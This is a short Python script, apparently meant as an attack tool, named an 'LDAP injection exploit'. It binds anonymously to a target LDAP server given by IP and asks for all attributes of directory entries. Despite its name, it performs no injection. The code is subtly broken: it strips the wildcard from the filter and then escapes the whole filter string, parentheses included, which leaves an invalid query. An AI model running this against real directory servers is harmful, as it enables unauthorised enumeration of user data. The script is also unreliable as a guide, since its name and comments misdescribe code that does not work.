import argparse
import ldap3

def ldap_injection_exploit(ldap_server, search_base, search_filter):
    # Create LDAP connection
    server = ldap3.Server(ldap_server, get_info=ldap3.ALL)
    conn = ldap3.Connection(server, auto_bind=True)

    # Perform LDAP injection attack
    search_filter = search_filter.replace("*", "")  # Remove wildcard character
    escaped_filter = ldap3.utils.conv.escape_filter_chars(search_filter)
    conn.search(search_base=search_base, search_filter=escaped_filter, attributes=['*'])

    # Print results
    for entry in conn.entries:
        print(entry)

    # Close the connection
    conn.unbind()

def main():
    parser = argparse.ArgumentParser(description='LDAP Injection Exploit')
    parser.add_argument('target_ip', help='Target LDAP server IP')
    parser.add_argument('--domain-name', help='Target domain name', required=True)
    args = parser.parse_args()

    ldap_server = f"ldap://{args.target_ip}:389"
    search_base = f"dc={args.domain_name.split('.')[0]},dc={args.domain_name.split('.')[1]}"
    search_filter = "(cn=*)"

    ldap_injection_exploit(ldap_server, search_base, search_filter)

if __name__ == '__main__':
    main()